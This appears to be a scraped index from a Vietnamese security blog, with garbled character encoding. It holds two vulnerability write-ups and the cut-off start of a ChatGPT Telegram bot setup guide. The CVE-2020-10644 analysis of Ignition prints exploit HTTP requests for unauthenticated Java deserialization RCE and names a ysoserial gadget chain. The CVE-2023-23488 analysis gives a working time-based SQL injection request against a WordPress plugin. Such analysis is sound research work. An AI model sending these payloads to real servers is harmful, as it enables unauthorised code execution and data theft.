debug Ph√¢n t√≠ch CVE-2020-10644 CVE n√†y ƒë∆∞·ª£c m√¥ t·∫£ r·∫±ng\n M·ªôt k·∫ª t·∫•n c√¥ng ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c c√≥ th·ªÉ khai th√°c c·∫•u h√¨nh m·∫∑c ƒë·ªãnh ƒë·ªÉ th·ª±c thi m√£ t·ª´ xa d∆∞·ªõi d·∫°ng SYSTEM tr√™n Windows ho·∫∑c root tr√™n Linux.\n Vi·ªác khai th√°c ƒë·ªÉ ƒë∆∞·ª£c RCE th√¨ ch√∫ng ta c·∫ßn ƒëi qua 3 y·∫øu t·ªë\n Truy c·∫≠p ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c v√†o t√†i nguy√™n nh·∫°y c·∫£m Java Deserialization kh√¥ng an to√†n S·ª≠ d·ª•ng th∆∞ vi·ªán Java kh√¥ng an to√†n  Ignition l·∫Øng nghe tr√™n nhi·ªÅu port TCP v√† UDP kh√°c nhau ƒë·ªÉ x·ª≠ l√Ω c√°c giao th·ª©c SCADA v√† c√°c ch·ª©c nƒÉng kh√°c. C√°c port ch√≠nh bao g·ªìm TCP 8088 v√† TCP/TLS 8043, ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ƒëi·ªÅu khi·ªÉn m√°y ch·ªß qu·∫£n tr·ªã th√¥ng qua HTTP(S), v√† x·ª≠ l√Ω giao ti·∫øp gi·ªØa c√°c th√†nh ph·∫ßn c·ªßa Ignition.\nC√≥ m·ªôt s·ªë endpoint API ƒëang l·∫Øng nghe tr√™n c·ªïng ƒë√≥, nh∆∞ng endpoint ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ exploit n√†y l√† t·∫°i /system/gateway. Endpoint API n√†y cho ph√©p ng∆∞·ªùi d√πng c√≥ th·ªÉ g·ªçi h√†m t·ª´ xa, tuy nhi√™n ch·ªâ m·ªôt s·ªë √≠t h√†m ƒë∆∞·ª£c g·ªçi b·ªüi ng∆∞·ªùi d√πng ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c (Login.designer() l√† m·ªôt trong s·ªë ƒë√≥). N√≥ giao ti·∫øp v·ªõi c√°c client b·∫±ng c√°ch s·ª≠ d·ª•ng XML ch·ª©a c√°c ƒë·ªëi t∆∞·ª£ng Java ƒë∆∞·ª£c serialized trong ƒë√≥, v√† code c·ªßa n√≥ ƒë·∫∑t trong class com.inductiveautomation.ignition.gateway.servlets.Gateway\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  POST /system/gateway HTTP/1.1 Content-type: text/xml User-Agent: Java/11.0.4 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 845 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;requestwrapper\u0026gt; \u0026lt;version\u0026gt;1184437744\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;2\u0026lt;/scope\u0026gt; \u0026lt;message\u0026gt; \u0026lt;messagetype\u0026gt;199\u0026lt;/messagetype\u0026gt; \u0026lt;messagebody\u0026gt; \u0026lt;arg name=\u0026#34;funcId\u0026#34;\u0026gt;\u0026lt;![CDATA[Login]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;subFunction\u0026#34;\u0026gt;\u0026lt;![CDATA[designer]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;arg\u0026#34; index=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;![CDATA[H4sIAAAAAAAAAFvzloG1hMG1Wqm0OLUoLzE3VTc1L1nJSinFMMnQyDApMdnEyCzJyDhVSUepILG4uDy/KAWXiloAvpMDvEwAAAA=]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;arg\u0026#34; index=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;![CDATA[H4sIAAAAAAAAAFvzloG1uIhBMCuxLFEvJzEvXc8zryQ1PbVI6NGCJd8b2y2YGBg9GVjLEnNKUyuKGAQQ6vxKc5NSi9rWTJXlnvKgm4mBoaKgItLQAACH6ksSUQAAAA==]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;arg\u0026#34; index=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;![CDATA[H4sIAAAAAAAAAFvzloG1hIHXtbQovyBV3yc/LyU/DwDHsV9XFAAAAA==]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;arg\u0026#34; index=\u0026#34;3\u0026#34;\u0026gt;\u0026lt;![CDATA[H4sIAAAAAAAAAFvzloG1hIHfxTXYO8Q/QNc/MDDE1MkYAOTFO60WAAAA]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;/messagebody\u0026gt; \u0026lt;/message\u0026gt; \u0026lt;locale\u0026gt; \u0026lt;l\u0026gt;en\u0026lt;/l\u0026gt; \u0026lt;c\u0026gt;GB\u0026lt;/c\u0026gt; \u0026lt;v\u0026gt;\u0026lt;/v\u0026gt; \u0026lt;/locale\u0026gt; \u0026lt;/requestwrapper\u0026gt;   V·∫≠y t·∫°i sao n√≥ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c h√†m Login.designer()\nRequest ch·ª©a c√°c ƒë·ªëi t∆∞·ª£ng Java ƒë∆∞·ª£c serialized truy·ªÅn v√†o c√°c h√†m c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi t·ª´ xa. V√≠ d·ª• request tr√™n cho th·∫•y ch√∫ng ta c√≥ th·ªÉ g·ªçi ƒë·∫øn h√†m designer() c·ªßa class com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login v·ªõi 4 args.\nCall stack tr∆∞·ªõc khi ch√∫ng ta ƒë·∫øn Login.designer() nh∆∞ sau:\n1 2 3  com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost() com.inductiveautomation.ignition.gateway.servlets.gateway.AbstractGatewayFunction.invoke() com.inductiveautomation.ignition.gateway.servlets.gateway.functions.Login.designer()   Tr∆∞·ªõc m·ªói function c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi th√¥ng qua endpoint /system/gateway ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒëo·∫°n @GatewayFunction\nƒêo·∫°n code @GatewayFunction l√† m·ªôt annotation trong Java, ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ x√°c ƒë·ªãnh r·∫±ng ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c ch√∫ th√≠ch v·ªõi annotation n√†y l√† m·ªôt gateway function.\nTrong Automation Ignition, c√°c gateway function l√† c√°c ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c g·ªçi t·ª´ c√°c module kh√°c nhau tr√™n gateway ƒë·ªÉ th·ª±c hi·ªán c√°c t√°c v·ª• nh∆∞ ƒë·ªçc v√† ghi d·ªØ li·ªáu, x·ª≠ l√Ω logic, k·∫øt n·ªëi v·ªõi c√°c thi·∫øt b·ªã v√† h·ªá th·ªëng kh√°c.\nKhi m·ªôt ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c ƒë√°nh d·∫•u v·ªõi annotation @GatewayFunction, n√≥ s·∫Ω ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi h·ªá th·ªëng gateway v√† c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi b·ªüi c√°c module kh√°c tr√™n c√πng m·ªôt gateway ho·∫∑c t·ª´ c√°c gateway kh√°c trong m·∫°ng l∆∞·ªõi.\nAnnotation @GatewayFunction c≈©ng cung c·∫•p c√°c th√¥ng tin cho h·ªá th·ªëng v·ªÅ c√°c tham s·ªë ƒë·∫ßu v√†o v√† ƒë·∫ßu ra c·ªßa ph∆∞∆°ng th·ª©c, c≈©ng nh∆∞ t√™n v√† m√¥ t·∫£ c·ªßa gateway function.\nTr·ªü l·∫°i v·ªõi com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost() Gateway.doPost() th·ª±c hi·ªán check version v√† check m·ªôt v√†i c√°i kh√°c, sau ƒë√≥ g·ª≠i y√™u c·∫ßu t·ªõi AbstractGatewayFunction.invoke(), y√™u c·∫ßu n√†y s·∫Ω ph√¢n t√≠ch c√∫ ph√°p v√† x√°c th·ª±c y√™u c·∫ßu ƒë√≥ tr∆∞·ªõc khi g·ªçi Login.designer()\nAbstractGatewayFunction.invoke() th·ª±c hi·ªán c√°c c√¥ng vi·ªác sau:\n Ph√¢n t√≠ch request nh·∫≠n ƒë∆∞·ª£c X√°c ƒë·ªãnh function c·∫ßn ƒë∆∞·ª£c g·ªçi Check function args  ƒê·∫£m b·∫£o r·∫±ng function args l√† an to√†n ƒë·ªÉ decode ƒê·∫£m b·∫£o s·ªë l∆∞·ª£ng args ph√π h·ª£p v·ªõi function ƒë√≠ch   Th·ª±c hi·ªán g·ªçi function v·ªõi c√°c args ƒë√£ ƒë∆∞·ª£c decode Th·ª±c hi·ªán g·ª≠i response tr·∫£ l·∫°i client  Tuy nhi√™n, ch·ªâ c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c nh·ªØng function n√†o ƒë∆∞·ª£c ƒë√°nh d·∫•u l√† 1 annotation v·ªõi @GatewayFunction\nTa th·∫•y t·∫°i AbstractGatewayFunction.invoke() c√≥ th·ª±c hi·ªán decode args, s·ª≠ d·ª•ng h√†m decodeToObjectFragile() v√† th·ª±c hi·ªán truy·ªÅn classWhitelist v·ªõi gi√° tr·ªã ƒë∆∞·ª£c l·∫•y t·ª´\n1  classWhitelist = Sets.newHashSet(SaferObjectInputStream.DEFAULT_WHITELIST);   B√™n trong h√†m s·ª≠ d·ª•ng SaferObjectInputStream v·ªõi Whitelist b√™n d∆∞·ªõi, ch√∫ng ta kh√¥ng th·ªÉ t·∫•n c√¥ng tr·ª±c ti·∫øp v√†o ƒë√¢y ƒë∆∞·ª£c m√† c·∫ßn ph·∫£i th·ª±c hi·ªán ƒëi ƒë∆∞·ªùng v√≤ng kh√°c.\n1 2 3 4 5 6  public static final Set\u0026lt;Class\u0026lt;?\u0026gt;\u0026gt; DEFAULT_WHITELIST = ImmutableSet.of(String.class, Byte.class, Short.class, Integer.class, Long.class, Number.class, new Class[]{Float.class, Double.class, Boolean.class, Date.class, Color.class, ArrayList.class, HashMap.class, Enum.class}); private final Set\u0026lt;String\u0026gt; whitelist; public SaferObjectInputStream(InputStream in) throws IOException { this(in, DEFAULT_WHITELIST); }   Nh∆∞ng, n·∫øu ch√∫ng ta ki·∫øm ƒë∆∞·ª£c h√†m n√†o g·ªçi decodeToObjectFragile() nh∆∞ng kh√¥ng th·ª±c hi·ªán truy·ªÅn class whiteList, ch√∫ng ta ho√†n to√†n c√≥ th·ªÉ t·∫•n c√¥ng v√†o ƒë√¢y.\nInsecure Java Deserialization Do AbstractGatewayFunction.invoke() c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c nh·ªØng function n√†o ƒë∆∞·ª£c ƒë√°nh d·∫•u l√† 1 annotation. V·∫≠y ch·ªâ c·∫ßn t√¨m th√™m ƒëi·ªÅu ki·ªán h√†m ƒë√≥ s·ª≠ d·ª•ng decodeToObjectFragile() kh√¥ng truy·ªÅn th√™m classWhitelist l√† ƒë∆∞·ª£c.\nC≈©ng may m·∫Øn c√≥ function nh∆∞ th·∫ø, th·ªèa m√£n ƒëi·ªÅu ki·ªán n√™u tr√™n\ncom.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload.getDiffs()\nG·ª≠i request nh∆∞ sau v√† hit break point\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  POST /system/gateway HTTP/1.1 Host: 172.17.120.70 Content-type: text/xml User-Agent: Java/11.0.4 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 623 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;requestwrapper\u0026gt; \u0026lt;version\u0026gt;1184437744\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;2\u0026lt;/scope\u0026gt; \u0026lt;message\u0026gt; \u0026lt;messagetype\u0026gt;199\u0026lt;/messagetype\u0026gt; \u0026lt;messagebody\u0026gt; \u0026lt;arg name=\u0026#34;funcId\u0026#34;\u0026gt;\u0026lt;![CDATA[ProjectDownload]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;subFunction\u0026#34;\u0026gt;\u0026lt;![CDATA[getDiffs]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;arg name=\u0026#34;arg\u0026#34; index=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;![CDATA[H4sIAAAAAAAAAFvzloG1hMG1Wqm0OLUoLzE3VTc1L1nJSinFMMnQyDApMdnEyCzJyDhVSUepILG4uDy/KAWXiloAvpMDvEwAAAA=]]\u0026gt;\u0026lt;/arg\u0026gt; \u0026lt;/messagebody\u0026gt; \u0026lt;/message\u0026gt; \u0026lt;locale\u0026gt; \u0026lt;l\u0026gt;en\u0026lt;/l\u0026gt; \u0026lt;c\u0026gt;GB\u0026lt;/c\u0026gt; \u0026lt;v\u0026gt;\u0026lt;/v\u0026gt; \u0026lt;/locale\u0026gt; \u0026lt;/requestwrapper\u0026gt;   T√≥m l·∫°i, chain s·∫Ω nh∆∞ th·∫ø n√†y\n1 2 3 4 5 6 7 8 9  com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost() üëáÔ∏è com.inductiveautomation.ignition.gateway.servlets.gateway.AbstractGatewayFunction.invoke() üëáÔ∏è com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload.getDiffs() üëáÔ∏è com.inductiveautomation.ignition.common.Base64.decodeToObjectFragile() üëáÔ∏è ((ObjectInputStream)ois).readObject()   May thay phi√™n b·∫£n n√†y c√≥ commons-beanutils-1.9.2.jar trong lib, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng ysoserial v·ªõi CommonsBeanutils1, encode base64 r·ªìi truy·ªÅn v√†o arg request b√™n tr√™n, l√† c√≥ th·ªÉ RCE\nTham kh·∫£o  https://www.flashback.sh/blog/rce-me-v2-inductive-automation-ignition-rce https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami?rq=inductive https://www.anquanke.com/post/id/208464  ","permalink":"https://minhtuanact.ml/posts/phan-tich-cve-2020-10644-inductive-automation-ignition-rce/","summary":"V√†o m·ªôt bu·ªïi chi·ªÅu, em teammate @lengocanh c√≥ r·ªß m√¨nh ph√¢n t√≠ch m·ªôt v√†i CVE c·ªßa Inductive Automation Ignition. ·ªû ƒë√¢y m√¨nh ch·ªçn m·ªôt CVE ph√¢n t√≠ch kh√° ƒë∆°n gi·∫£n l√† CVE-2020-10644 ƒë·ªÉ kh·ªüi ƒë·∫ßu chu·ªói series ph√¢n t√≠ch c√°c l·ªó h·ªïng c·ªßa Inductive Automation Ignition. ƒê√¢y l√† l·ªó h·ªïng ƒë∆∞·ª£c team Flashback t√¨m ra v√† ƒëem tham d·ª± Pwn2Own Miami 2020 v√†o th√°ng 1/2020. L·ªó h·ªïng n√†y cho ph√©p attacker c√≥ th·ªÉ RCE unauthen ƒë·∫øn server ƒëang ch·∫°y Inductive Automation Ignition t·ª´ phi√™n b·∫£n 8.","title":"Ph√¢n t√≠ch CVE-2020-10644 - Inductive Automation Ignition RCE"},{"content":"Xin ch√†o m·ªçi ng∆∞·ªùi, ƒë√£ l√¢u r·ªìi m√¨nh m·ªõi vi·∫øt m·ªôt b√†i ph√¢n t√≠ch CVE. D·∫°o g·∫ßn ƒë√¢y xoay quanh nhi·ªÅu chuy·ªán :rice::shirt::ear_of_rice::money_with_wings: n√™n √≠t th·ªùi gian ƒë·ªÉ vi·∫øt l√°ch. B√†i vi·∫øt n√†y l√† m·ªôt c∆° h·ªôi t√¨nh c·ªù ƒë·ªÉ m√¨nh t√¨m ki·∫øm l·ªó h·ªïng tr√™n WordPress. Tuy nhi√™n, m√¨nh ƒë√£ b·ªè qua r·∫•t nhi·ªÅu tr∆∞·ªùng h·ª£p, v√† m√¨nh mu·ªën chia s·∫ª v·ªõi c√°c b·∫°n v·ªÅ m·ªôt l·ªó h·ªïng c·ª• th·ªÉ.\nCVE-2023-23488 CVE-2023-23488 ƒë∆∞·ª£c mi√™u t·∫£ r√µ r√†ng t·∫°i ƒë∆∞·ªùng link https://www.tenable.com/security/research/tra-2023-2. ƒê√¢y l√† m·ªôt l·ªó h·ªïng Unauth SQL injection ·∫£nh h∆∞·ªüng ƒë·∫øn plugin WordPress Paid Memberships Pro phi√™n b·∫£n \u0026lt; 2.9.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i c√°c truy v·∫•n SQL t√πy √Ω ƒë·∫øn c∆° s·ªü d·ªØ li·ªáu c·ªßa trang web th√¥ng qua tham s·ªë code c·ªßa ƒë∆∞·ªùng d·∫´n REST /pmpro/v1/order.\nƒê·ªÉ khai th√°c l·ªó h·ªïng n√†y, c√≥ th·ªÉ s·ª≠ d·ª•ng payload TimeBased SQL Injection th√¥ng th∆∞·ªùng. C√°ch khai th√°c r·∫•t ƒë∆°n gi·∫£n nh∆∞ sau (kh√¥ng c·∫ßn x√°c th·ª±c):\n1  GET /?rest_route=/pmpro/v1/order\u0026amp;code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(1)))a)--%20- HTTP/1.1   V·∫≠y t·∫°i sao l·∫°i d·∫´n t·ªõi l·ªó h·ªïng n√†y, c√†i ƒë·∫∑t v√† ph√¢n t√≠ch code plugin n√†y theo version 2.9.7 c√≥ ch·ª©a l·ªó h·ªïng t·∫°i: https://downloads.wordpress.org/plugin/paid-memberships-pro.2.9.7.zip\nC·ª±c k·ª≥ d·ªÖ d√†ng ch√∫ng ta c√≥ th·ªÉ t√¨m th·∫•y l·ªó h·ªïng ƒë∆∞·ª£c th·∫•y ·ªü ƒë√¢y. S·ª≠ d·ª•ng REST API c·ªßa Wordpress ƒë∆∞·ª£c ƒëƒÉng k√Ω theo router\nnh·∫£y v√†o function pmpro_rest_api_permissions_get_order() v·ªõi\n1  GET /?rest_route=/pmpro/v1/order HTTP/1.1   Sau ƒë√≥ truy·ªÅn th√™m tham s·ªë code v√†o kh·ªüi t·∫°o MemberOrder, nh·∫£y tr·ª±c ti·∫øp ƒë·∫øn __construct\n·ªû ƒë√¢y ta truy·ªÅn gi√° tr·ªã code kh√¥ng ph·∫£i l√† s·ªë s·∫Ω nh·∫£y sang function getMemberOrderByCode($id)\nT·∫°i ƒë√¢y gi√° tr·ªã code ƒë∆∞·ª£c truy·ªÅn v√†o ho√†n to√†n kh√¥ng ƒë∆∞·ª£c filter hay escape g√¨, t·∫°i ƒë√¢y ch√∫ng ta c√≥ th·ªÉ inject SQL v√†o ƒë√¢y theo ki·ªÉu TimeBased nh∆∞ PoC b√™n tr√™n m√¨nh ƒë√£ n√™u. M·ªçi b∆∞·ªõc th·ª±c hi·ªán ƒë·ªÅu kh√¥ng c·∫ßn x√°c th·ª±c.\nNh∆∞ng ƒëi·ªÅu k·ª≥ l·∫° ·ªü ƒë√¢y l√† m√¨nh ho√†n to√†n, th∆∞·ªùng xuy√™n g·∫∑p nh·ªØng ƒëo·∫°n code vi·∫øt ki·ªÉu n√†y tr√™n Wordpress, m√¨nh th∆∞·ªùng xuy√™n b·ªè qua nh·ªØng ƒëo·∫°n code n√†y v√¨ n√≥ bi·∫øn ƒë∆∞·ª£c ngƒÉn c√°ch b·ªüi '\u0026quot; . $code . \u0026quot;'khi n√†y Wordpress s·∫Ω t·ª± ƒë·ªông th√™m slash v√†o m·ªói khi truy·ªÅn ' ho·∫∑c \u0026quot; th√†nh \\' ho·∫∑c \\\u0026quot; =\u0026gt; kh√¥ng t·∫•n c√¥ng SQL Injection ƒë∆∞·ª£c do kh√¥ng th·ªÉ bypass qua d·∫•u ' ho·∫∑c \u0026quot;\nAddslash t·∫°i Wordpress Test th·ª≠ v·ªõi ƒëo·∫°n code sau\n1 2 3  $code = $_GET[\u0026#39;code\u0026#39;]; var_dump(\u0026#34;SELECT id FROM $wpdb-\u0026gt;pmpro_membership_ordersWHERE code = \u0026#39;\u0026#34; . $code . \u0026#34;\u0026#39; LIMIT 1\u0026#34;); die();   V·ªõi response t·ª´ Wordpress\nCh√∫ng ta c√≥ th·ªÉ th·∫•y r·∫±ng gi√° tr·ªã $_GET['code'] ƒë√£ t·ª± ƒë·ªông ƒë∆∞·ª£c th√™m slash v√†o, t·ª´ ƒë√¢y ch√∫ng ta kh√¥ng th·ªÉ n√†o break ra kh·ªèi nh√°y ƒë∆°n ƒë·ªÉ tho√°t kh·ªèi string. T·ª´ ƒë√¢y m√¨nh lu√¥n t∆∞·ªüng vi·∫øt code theo ki·ªÉu b√™n tr√™n l√† an to√†n do m√¨nh kh√¥ng th·ªÉ tho√°t kh·ªèi nh√°y ƒë∆°n!!\nSau m·ªôt h·ªìi h·ªèi ChatGPT, WordPress s·∫Ω t·ª± ƒë·ªông x·ª≠ l√Ω v√† √°p d·ª•ng addslashes() cho c√°c gi√° tr·ªã n√†y ƒë·ªÉ ƒë·∫£m b·∫£o r·∫±ng ch√∫ng an to√†n khi ƒë∆∞·ª£c s·ª≠ d·ª•ng trong c√°c c√¢u l·ªánh SQL ho·∫∑c c√°c t√¨nh hu·ªëng kh√°c. H√†m ƒë∆∞·ª£c g·ªçi l√™n ngay t·ª´ wp-setting.php\nV·ªõi ghi ch√∫ r√µ r√†ng r·∫±ng s·ª≠ d·ª•ng ƒë·ªÉ escape cho wpdb\nM√¨nh ƒë√£ test th·ª≠ th√¨ v·ªõi m·ªçi $_GET, $_POST, $_COOKIE, $_SERVER khi truy·ªÅn t·ª´ input ng∆∞·ªùi d√πng th√¨ ƒë·ªÅu s·∫Ω b·ªã th√™m slash v√†o.\nTuy nhi√™n, t·∫°i sao khi s·ª≠ d·ª•ng REST API th√¨ Wordpress l·∫°i xo√° m·∫•t d·∫•u slash ƒëi, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn l·ªó h·ªïng CVE-2023-23488. Ch√∫ng ta c√≥ th·ªÉ break ra kh·ªèi d·∫•u nh√°y ƒë∆°n, inject c√¢u l·ªánh SQL tu·ª≥ √Ω.\nV·∫≠y t·∫°i sao l·∫°i nh∆∞ th·∫ø, Wordpress th√™m slash xong r·ªìi l·∫°i xo√° slash ƒëi l√† sao?? L·∫°i ƒëi h·ªèi ChatGPT th√¨ ho√° ra WordPress c√≥ s·ª≠ d·ª•ng m·ªôt c∆° ch·∫ø ƒë·ªÉ lo·∫°i b·ªè d·∫•u backslash \\ ƒë∆∞·ª£c th√™m v√†o khi s·ª≠ d·ª•ng REST API.\nT·∫°i ƒë√¢y request ƒë∆∞·ª£c g·ª≠i t·ªõi REST API s·∫Ω ƒë∆∞·ª£c load v√†o rest_api_loaded(), sau ƒë√≥ ti·∫øp t·ª•c ƒë∆∞·ª£c handle t·∫°i WP_REST_Server::serve_request()\nV√† ƒë∆∞·ª£c unslash() t·∫°i ƒë√¢y\nTh·∫≠t v·∫≠y, th·ª≠ var_dump($request) ch√∫ng ta ƒë∆∞·ª£c k·∫øt qu·∫£\nK·∫øt lu·∫≠n V·∫≠y m√¨nh ƒë√£ b·ªè qua kha kh√° nhi·ªÅu l·ªó h·ªïng SQL Injection v√¨ b·ªè qua c√°ch vi·∫øt n·ªëi chu·ªói n√†y. L√∫c n√†o m√¨nh c≈©ng tin r·∫±ng kh√¥ng th·ªÉ bypass ƒë∆∞·ª£c qua d·∫•u nh√°y khi code d·∫°ng ƒë√≥ :(. V·ªõi REST API c·ªßa Wordpress th√¨ ho√†n to√†n c√≥ th·ªÉ.\nM·ªôt s·ªë c√°ch ph√≤ng tr√°nh l·ªó h·ªïng SQL Injection khi s·ª≠ d·ª•ng REST API trong WordPress, v√≠ d·ª•:\n S·ª≠ d·ª•ng esc_sql() filter input t·ª´ ng∆∞·ªùi d√πng truy·ªÅn v√†o S·ª≠ d·ª•ng prepare() ƒë·ªÉ truy v·∫•n an to√†n trong Wordpress \u0026hellip;  ","permalink":"https://minhtuanact.ml/posts/phan-tich-cve-2023-23488-paid-memberships-pro-298-unauthenticated-blind-sqli-va-van-de-voi-request-trong-wordpress/","summary":"Xin ch√†o m·ªçi ng∆∞·ªùi, ƒë√£ l√¢u r·ªìi m√¨nh m·ªõi vi·∫øt m·ªôt b√†i ph√¢n t√≠ch CVE. D·∫°o g·∫ßn ƒë√¢y xoay quanh nhi·ªÅu chuy·ªán :rice::shirt::ear_of_rice::money_with_wings: n√™n √≠t th·ªùi gian ƒë·ªÉ vi·∫øt l√°ch. B√†i vi·∫øt n√†y l√† m·ªôt c∆° h·ªôi t√¨nh c·ªù ƒë·ªÉ m√¨nh t√¨m ki·∫øm l·ªó h·ªïng tr√™n WordPress. Tuy nhi√™n, m√¨nh ƒë√£ b·ªè qua r·∫•t nhi·ªÅu tr∆∞·ªùng h·ª£p, v√† m√¨nh mu·ªën chia s·∫ª v·ªõi c√°c b·∫°n v·ªÅ m·ªôt l·ªó h·ªïng c·ª• th·ªÉ.","title":"Ph√¢n t√≠ch CVE-2023-23488 Paid Memberships Pro \u003c 2.9.8 - Unauthenticated Blind SQLi v√† v·∫•n ƒë·ªÅ v·ªõi request trong Wordpress"},{"content":"Ch·∫Øc h·∫≥n c√≥ l·∫Ω nhi·ªÅu b·∫°n s·ª≠ d·ª•ng ChatGPT g·∫∑p t√¨nh tr·∫°ng qu√° t·∫£i nh∆∞ th·∫ø n√†y tr√™n phi√™n b·∫£n web, c≈©ng ƒë√∫ng v√¨ ChatGPT tƒÉng tr∆∞·ªüng qu√° kh·ªßng khi·∫øp, 100 tri·ªáu ng∆∞·ªùi d√πng trong v√≤ng c√≥ 60 ng√†y, m·∫•t 30 tri·ªáu ƒë√¥ ƒë·ªÉ duy tr√¨ h·ªá th·ªëng. Hi·ªán t·∫°i s·∫Øp t·ªõi ChatGPT c√≥ ra m·∫Øt phi√™n b·∫£n ChatGPT Plus v·ªõi gi√° $20/th√°ng, t∆∞∆°ng ·ª©ng v√†o kho·∫£ng 1,5% ng∆∞·ªùi d√πng hi·ªán t·∫°i s·ª≠ d·ª•ng th√¨ m·ªõi ƒë·ªß b√π v√†o ti·ªÅn duy tr√¨ h·ªá th·ªëng kia. Tuy nhi√™n ChatGPT c√≥ cung c·∫•p API, n·∫øu ai l∆∞·ªùi nh∆∞ m√¨nh th√¨ s·ª≠ d·ª•ng API cho nhanh, ƒë·ª° ph·∫£i login qua b·∫£n web, l·∫°i c√≤n hay b·ªã cloudflare check xem c√≥ ph·∫£i robots k :|\nBuild ChatGPT Telegram bot M√¨nh th·ª≠ qua nhi·ªÅu repo tr√™n github nh∆∞ng s·ª≠ d·ª•ng repo n√†y th√¨ ƒë∆∞·ª£c, kh√¥ng bi·∫øt s·ª≠ d·ª•ng ƒë∆∞·ª£c ƒë·∫øn bao gi·ªù nh∆∞ng m√† hi·ªán t·∫°i n√≥ ch·∫°y ƒë∆∞·ª£c l√† ƒë∆∞·ª£c, ƒë·∫øn l√∫c n√≥ t√®o t√©o teo th√¨ l·∫°i t√¨m c√°ch kh√°c :joy:\nhttps://github.com/karfly/chatgpt_telegram_bot\nC√°ch setup c·ª±c k·ª≥ ƒë∆°n gi·∫£n\nB∆∞·ªõc 1: L·∫•y OpenAI Key t·∫°i https://platform.openai.com/  Login v√†o https://platform.openai.com/, sau ƒë√≥ ƒëi t·ªõi https://platform.openai.com/account/api-keys v√† t·∫°o 1 key m·ªõi v√† l∆∞u l·∫°i   B∆∞·ªõc 2: T·∫°o bot Telegram b·∫±ng @botfather, l·∫•y Telegram bot token c·ªßa b·∫°n  S·ª≠ d·ª•ng @botfather https://t.me/BotFather c·ªßa Telegram ƒë·ªÉ t·∫°o 1 bot m·ªõi c·ªßa b·∫°n, sau ƒë√≥ nh·ªõ l·∫•y bot token nh√©.  B∆∞·ªõc 3: Clone repo https://github.com/karfly/chatgpt_telegram_bot v·ªÅ, sau ƒë√≥ c√†i ƒë·∫∑t env  Ch·∫°y 2 l·ªánh sau: 1 2  mv config/config.example.yml config/config.yml mv config/config.example.env config/config.env   Sau ƒë√≥ ch·ªânh s·ª≠a file config/config.yml th√™m telegram bot token v√† openai token ƒë√£ l·∫•y t·ª´ b∆∞·ªõc 1 v√† b∆∞·ªõc 2 l∆∞u v√†o file config  B∆∞·ªõc 4: Ch·ªânh s·ª≠a file docker-compose.yml  Th·ª±c hi·ªán xo√° d√≤ng 9 v√† 29 ƒëi Th·ª±c hi·ªán xo√° d√≤ng 8, 9, 28, 29 ƒëi, kh√¥ng c·∫ßn public port mongodb 1 2 3 4  ports: - ${MONGODB_PORT:-27017}:${MONGODB_PORT:-27017} ports: - ${MONGO_EXPRESS_PORT:-8081}:${MONGO_EXPRESS_PORT:-8081}     B∆∞·ªõc 5: Ch·∫°y docker-compose  Ch·ªâ c·∫ßn ch·∫°y docker-compose l√™n l√† xong, y√™u c·∫ßu h·ªá th·ªëng c·∫ßn c√≥ docker nh√© :joy: 1  docker-compose --env-file config/config.env up --build     K·∫øt qu·∫£ V√† ƒë√¢y l√† th√†nh qu·∫£  M√¨nh c·∫£m nh·∫≠n th·∫•y n√≥ ch·∫°y nhanh h∆°n l√† v·ªõi b·∫£n web, b·∫£n web generate t·ª´ng ch·ªØ m·ªôt ch·ªù s·ªët ru·ªôt, c√≤n ·ªü ƒë√¢y ch·ªâ 